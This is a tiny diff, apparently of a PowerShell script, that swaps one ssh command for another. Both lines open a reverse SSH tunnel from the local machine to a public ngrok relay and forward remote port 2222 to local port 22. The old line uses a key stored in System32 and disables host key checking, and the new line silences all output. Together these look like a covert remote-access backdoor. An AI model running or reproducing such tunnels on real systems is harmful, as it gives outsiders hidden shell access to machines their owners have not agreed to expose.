@@ -1,1 +1,5 @@
-ssh -i "C:\Windows\System32\OpenSSH\revssh_key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL logosofico@0.tcp.sa.ngrok.io -p 11041 -N -R 2222:localhost:22
+ssh -o "ServerAliveInterval=60" `
+    -o "ServerAliveCountMax=3" `
+    -o "ExitOnForwardFailure=yes" `
+    -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19687 -N `
+    > $null 2>&1
